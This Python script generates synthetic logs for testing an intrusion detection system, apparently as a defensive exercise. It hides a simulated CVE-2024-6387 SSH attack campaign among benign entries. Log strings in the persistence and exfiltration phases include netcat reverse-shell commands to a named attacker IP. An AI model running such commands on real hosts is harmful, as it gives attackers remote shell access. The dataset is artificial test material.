#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
generate_cve_2024_6387_scenario.py
--------------------------------------------------------
Generates realistic log dataset with embedded CVE-2024-6387
(regresshion) SSH attack campaign across multiple days.

Attack Timeline:
  Day 0: Initial reconnaissance (nmap scanning)
  Day 1: Exploit attempts (sshd crashes, SIGALRM race condition)
  Day 2: Successful compromise (file modifications, user creation)
  Day 3: Privilege escalation (uid=0 root access)
  Day 4: Persistence (cron job, library tampering)
  Day 7: Lateral movement (network scanning from compromised host)
  Day 10: Data exfiltration (reverse shells, outbound connections)
"""

import json
import random
import time
from datetime import datetime, timedelta
from typing import List, Dict

# Attack infrastructure
ATTACKER_IP = "45.67.89.123"
ATTACKER_PORTS = [4444, 5555, 9999]
COMPROMISED_HOSTS = ["web-server-01", "db-server-02", "app-server-03"]
TARGET_USER = "sysop"

class CVE2024_6387_ScenarioGenerator:
    """Generate realistic CVE-2024-6387 attack campaign"""

    def __init__(self, start_time: datetime = None):
        self.start_time = start_time or datetime.now()
        self.benign_ips = [f"10.0.{random.randint(1,255)}.{random.randint(1,255)}" for _ in range(100)]
        self.benign_users = ["alice", "bob", "charlie", "david", "emma", "frank", "grace"]

    def get_timestamp(self, day_offset: int, hour: int = None, minute: int = None) -> str:
        """Get ISO timestamp for specific day/time in campaign"""
        dt = self.start_time + timedelta(days=day_offset)
        if hour is not None:
            dt = dt.replace(hour=hour, minute=minute or random.randint(0, 59))
        return dt.isoformat()

    def generate_benign_log(self, timestamp: str) -> Dict:
        """Generate realistic benign log entry"""
        log_types = [
            {
                "timestamp": timestamp,
                "level": "INFO",
                "source_ip": random.choice(self.benign_ips),
                "host": random.choice(COMPROMISED_HOSTS),
                "user": random.choice(self.benign_users),
                "text": f"User {random.choice(self.benign_users)} authenticated successfully via SSH"
            },
            {
                "timestamp": timestamp,
                "level": "INFO",
                "source_ip": random.choice(self.benign_ips),
                "host": random.choice(COMPROMISED_HOSTS),
                "text": f"GET /api/status HTTP/1.1 200 OK"
            },
            {
                "timestamp": timestamp,
                "level": "DEBUG",
                "source_ip": random.choice(self.benign_ips),
                "host": random.choice(COMPROMISED_HOSTS),
                "text": f"Database query executed: SELECT * FROM users WHERE active=1"
            },
            {
                "timestamp": timestamp,
                "level": "INFO",
                "source_ip": random.choice(self.benign_ips),
                "host": random.choice(COMPROMISED_HOSTS),
                "text": f"Cron job completed: /usr/bin/backup.sh"
            }
        ]
        return random.choice(log_types)

    # =========================================================
    # Attack Phase Generators
    # =========================================================

    def phase_1_reconnaissance(self) -> List[Dict]:
        """Day 0: Initial reconnaissance and scanning"""
        logs = []

        # Network scanning
        for minute in range(0, 60, 5):
            logs.append({
                "timestamp": self.get_timestamp(0, hour=2, minute=minute),
                "level": "WARNING",
                "source_ip": ATTACKER_IP,
                "host": COMPROMISED_HOSTS[0],
                "text": f"nmap scan detected from {ATTACKER_IP}: SYN scan on ports 22,80,443"
            })

        # SSH version enumeration
        logs.append({
            "timestamp": self.get_timestamp(0, hour=3, minute=15),
            "level": "INFO",
            "source_ip": ATTACKER_IP,
            "host": COMPROMISED_HOSTS[0],
            "text": f"SSH connection from {ATTACKER_IP}: Protocol version identification: SSH-2.0-OpenSSH_8.9p1"
        })

        return logs

    def phase_2_exploitation(self) -> List[Dict]:
        """Day 1: CVE-2024-6387 exploitation attempts"""
        logs = []

        # Multiple sshd crashes (SIGALRM race condition)
        for attempt in range(10):
            minute = attempt * 5
            logs.extend([
                {
                    "timestamp": self.get_timestamp(1, hour=4, minute=minute),
                    "level": "ERROR",
                    "source_ip": ATTACKER_IP,
                    "host": COMPROMISED_HOSTS[0],
                    "text": f"sshd[{10000+attempt}]: SIGALRM race condition triggered during authentication"
                },
                {
                    "timestamp": self.get_timestamp(1, hour=4, minute=minute+1),
                    "level": "CRITICAL",
                    "source_ip": ATTACKER_IP,
                    "host": COMPROMISED_HOSTS[0],
                    "text": f"sshd[{10000+attempt}]: segmentation fault at address 0x7fff8badc000"
                },
                {
                    "timestamp": self.get_timestamp(1, hour=4, minute=minute+2),
                    "level": "ERROR",
                    "source_ip": ATTACKER_IP,
                    "host": COMPROMISED_HOSTS[0],
                    "text": f"kernel: glibc malloc corruption detected in sshd process {10000+attempt}"
                }
            ])

        # Core dumps
        logs.append({
            "timestamp": self.get_timestamp(1, hour=4, minute=55),
            "level": "WARNING",
            "source_ip": "127.0.0.1",
            "host": COMPROMISED_HOSTS[0],
            "text": "Core dump generated: /var/crash/sshd.core.10009"
        })

        return logs

    def phase_3_compromise(self) -> List[Dict]:
        """Day 2: Successful compromise and system modifications"""
        logs = []

        # Successful exploitation
        logs.append({
            "timestamp": self.get_timestamp(2, hour=5, minute=10),
            "level": "CRITICAL",
            "source_ip": ATTACKER_IP,
            "host": COMPROMISED_HOSTS[0],
            "text": f"sshd[11000]: arbitrary code execution via SIGALRM handler from {ATTACKER_IP}"
        })

        # File modifications
        logs.extend([
            {
                "timestamp": self.get_timestamp(2, hour=5, minute=12),
                "level": "WARNING",
                "source_ip": "127.0.0.1",
                "host": COMPROMISED_HOSTS[0],
                "text": f"/etc/passwd modified: new user added - {TARGET_USER}:x:1001:1001:System Operator:/home/{TARGET_USER}:/bin/bash"
            },
            {
                "timestamp": self.get_timestamp(2, hour=5, minute=15),
                "level": "CRITICAL",
                "source_ip": "127.0.0.1",
                "host": COMPROMISED_HOSTS[0],
                "text": "/lib/libc.so.6 timestamp altered - possible library tampering"
            },
            {
                "timestamp": self.get_timestamp(2, hour=5, minute=18),
                "level": "WARNING",
                "source_ip": "127.0.0.1",
                "host": COMPROMISED_HOSTS[0],
                "text": "/etc/shadow modified - password hash changed for root user"
            }
        ])

        return logs

    def phase_4_privilege_escalation(self) -> List[Dict]:
        """Day 3: Privilege escalation to root"""
        logs = []

        logs.extend([
            {
                "timestamp": self.get_timestamp(3, hour=6, minute=5),
                "level": "CRITICAL",
                "source_ip": "127.0.0.1",
                "host": COMPROMISED_HOSTS[0],
                "user": TARGET_USER,
                "text": f"su: pam_unix(su:session): session opened for user root by {TARGET_USER}(uid=1001)"
            },
            {
                "timestamp": self.get_timestamp(3, hour=6, minute=6),
                "level": "CRITICAL",
                "source_ip": "127.0.0.1",
                "host": COMPROMISED_HOSTS[0],
                "user": "root",
                "text": "Shell spawned with uid=0 (root) from compromised user context"
            },
            {
                "timestamp": self.get_timestamp(3, hour=6, minute=10),
                "level": "WARNING",
                "source_ip": "127.0.0.1",
                "host": COMPROMISED_HOSTS[0],
                "user": "root",
                "text": "Root shell detected: /bin/bash -i spawned by non-standard process"
            }
        ])

        return logs

    def phase_5_persistence(self) -> List[Dict]:
        """Day 4: Establish persistence mechanisms"""
        logs = []

        # Malicious cron job
        logs.extend([
            {
                "timestamp": self.get_timestamp(4, hour=7, minute=0),
                "level": "CRITICAL",
                "source_ip": "127.0.0.1",
                "host": COMPROMISED_HOSTS[0],
                "user": "root",
                "text": f"Cron job created: */5 * * * * /usr/bin/nc -e /bin/bash {ATTACKER_IP} {ATTACKER_PORTS[2]}"
            },
            {
                "timestamp": self.get_timestamp(4, hour=7, minute=5),
                "level": "WARNING",
                "source_ip": "127.0.0.1",
                "host": COMPROMISED_HOSTS[0],
                "text": "New binary created: /usr/bin/update_check (suspicious - not in package database)"
            },
            {
                "timestamp": self.get_timestamp(4, hour=7, minute=10),
                "level": "CRITICAL",
                "source_ip": "127.0.0.1",
                "host": COMPROMISED_HOSTS[0],
                "text": "/etc/ld.so.preload modified - LD_PRELOAD persistence mechanism detected"
            }
        ])

        return logs

    def phase_6_lateral_movement(self) -> List[Dict]:
        """Day 7: Lateral movement to other hosts"""
        logs = []

        # Internal scanning
        logs.extend([
            {
                "timestamp": self.get_timestamp(7, hour=10, minute=0),
                "level": "WARNING",
                "source_ip": COMPROMISED_HOSTS[0],
                "host": COMPROMISED_HOSTS[1],
                "user": TARGET_USER,
                "text": f"nmap scan from internal host {COMPROMISED_HOSTS[0]}: targeting 10.0.0.0/24"
            },
            {
                "timestamp": self.get_timestamp(7, hour=10, minute=15),
                "level": "ERROR",
                "source_ip": COMPROMISED_HOSTS[0],
                "host": COMPROMISED_HOSTS[1],
                "text": f"sshd[20000]: SIGALRM race condition from {COMPROMISED_HOSTS[0]} (internal pivot)"
            },
            {
                "timestamp": self.get_timestamp(7, hour=10, minute=20),
                "level": "CRITICAL",
                "source_ip": COMPROMISED_HOSTS[0],
                "host": COMPROMISED_HOSTS[1],
                "text": f"Successful authentication from {COMPROMISED_HOSTS[0]} using stolen credentials"
            }
        ])

        return logs

    def phase_7_exfiltration(self) -> List[Dict]:
        """Day 10: Data exfiltration and command & control"""
        logs = []

        # Reverse shells
        for port in ATTACKER_PORTS:
            logs.extend([
                {
                    "timestamp": self.get_timestamp(10, hour=14, minute=0 + ATTACKER_PORTS.index(port) * 5),
                    "level": "CRITICAL",
                    "source_ip": COMPROMISED_HOSTS[0],
                    "dest_ip": ATTACKER_IP,
                    "dest_port": port,
                    "host": COMPROMISED_HOSTS[0],
                    "text": f"Outbound TCP connection to {ATTACKER_IP}:{port} - reverse shell detected"
                },
                {
                    "timestamp": self.get_timestamp(10, hour=14, minute=1 + ATTACKER_PORTS.index(port) * 5),
                    "level": "WARNING",
                    "source_ip": COMPROMISED_HOSTS[0],
                    "dest_ip": ATTACKER_IP,
                    "dest_port": port,
                    "host": COMPROMISED_HOSTS[0],
                    "text": f"Netcat process spawned: /usr/bin/nc -e /bin/bash {ATTACKER_IP} {port}"
                }
            ])

        # Data exfiltration
        logs.extend([
            {
                "timestamp": self.get_timestamp(10, hour=14, minute=30),
                "level": "CRITICAL",
                "source_ip": COMPROMISED_HOSTS[0],
                "dest_ip": ATTACKER_IP,
                "host": COMPROMISED_HOSTS[0],
                "text": f"Large data transfer detected: 50GB sent to {ATTACKER_IP} over 2 hours"
            },
            {
                "timestamp": self.get_timestamp(10, hour=15, minute=0),
                "level": "WARNING",
                "source_ip": COMPROMISED_HOSTS[0],
                "dest_ip": ATTACKER_IP,
                "host": COMPROMISED_HOSTS[0],
                "text": f"Suspicious file access pattern: /var/lib/mysql/* copied to /tmp/.hidden/"
            }
        ])

        return logs

    def generate_full_campaign(self, num_benign_logs: int = 50000) -> List[Dict]:
        """
        Generate complete attack campaign embedded in benign traffic

        Args:
            num_benign_logs: Number of benign logs to generate

        Returns:
            List of all logs (benign + malicious) sorted by timestamp
        """
        print(f"Generating CVE-2024-6387 attack campaign...")
        print(f"Attack timeline: {self.start_time} to {self.start_time + timedelta(days=10)}")

        # Generate attack phases
        attack_logs = []
        attack_logs.extend(self.phase_1_reconnaissance())
        print(f"  Phase 1 (Reconnaissance): {len(self.phase_1_reconnaissance())} logs")

        attack_logs.extend(self.phase_2_exploitation())
        print(f"  Phase 2 (Exploitation): {len(self.phase_2_exploitation())} logs")

        attack_logs.extend(self.phase_3_compromise())
        print(f"  Phase 3 (Compromise): {len(self.phase_3_compromise())} logs")

        attack_logs.extend(self.phase_4_privilege_escalation())
        print(f"  Phase 4 (Privilege Escalation): {len(self.phase_4_privilege_escalation())} logs")

        attack_logs.extend(self.phase_5_persistence())
        print(f"  Phase 5 (Persistence): {len(self.phase_5_persistence())} logs")

        attack_logs.extend(self.phase_6_lateral_movement())
        print(f"  Phase 6 (Lateral Movement): {len(self.phase_6_lateral_movement())} logs")

        attack_logs.extend(self.phase_7_exfiltration())
        print(f"  Phase 7 (Exfiltration): {len(self.phase_7_exfiltration())} logs")

        print(f"\nTotal attack logs: {len(attack_logs)}")

        # Generate benign logs distributed across the same timeframe
        benign_logs = []
        for i in range(num_benign_logs):
            day_offset = random.randint(0, 10)
            hour = random.randint(0, 23)
            minute = random.randint(0, 59)
            timestamp = self.get_timestamp(day_offset, hour, minute)
            benign_logs.append(self.generate_benign_log(timestamp))

        print(f"Total benign logs: {len(benign_logs)}")

        # Combine and sort by timestamp
        all_logs = attack_logs + benign_logs
        all_logs.sort(key=lambda x: x['timestamp'])

        print(f"\nTotal logs generated: {len(all_logs)}")
        print(f"Attack density: {len(attack_logs) / len(all_logs) * 100:.3f}%")

        return all_logs


def main():
    """Generate test dataset and save to file"""
    import argparse

    parser = argparse.ArgumentParser(description='Generate CVE-2024-6387 attack scenario')
    parser.add_argument('--output', '-o', default='data/test_logs/cve_2024_6387_campaign.json',
                        help='Output file path')
    parser.add_argument('--size', '-s', type=int, default=50000,
                        help='Number of benign logs to generate')
    parser.add_argument('--start-time', type=str, default=None,
                        help='Campaign start time (ISO format)')

    args = parser.parse_args()

    # Parse start time
    start_time = datetime.fromisoformat(args.start_time) if args.start_time else datetime.now() - timedelta(days=10)

    # Generate campaign
    generator = CVE2024_6387_ScenarioGenerator(start_time=start_time)
    logs = generator.generate_full_campaign(num_benign_logs=args.size)

    # Ensure output directory exists
    import os
    os.makedirs(os.path.dirname(args.output), exist_ok=True)

    # Save to file
    print(f"\nSaving logs to {args.output}...")
    with open(args.output, 'w') as f:
        for log in logs:
            f.write(json.dumps(log) + '\n')

    print(f"✅ Dataset generated successfully!")
    print(f"   Total logs: {len(logs):,}")
    print(f"   File size: {os.path.getsize(args.output) / (1024*1024):.2f} MB")
    print(f"\nTo test with V3 system, run:")
    print(f"   python3 tests/run_v3_detection.py --input {args.output}")


if __name__ == '__main__':
    main()
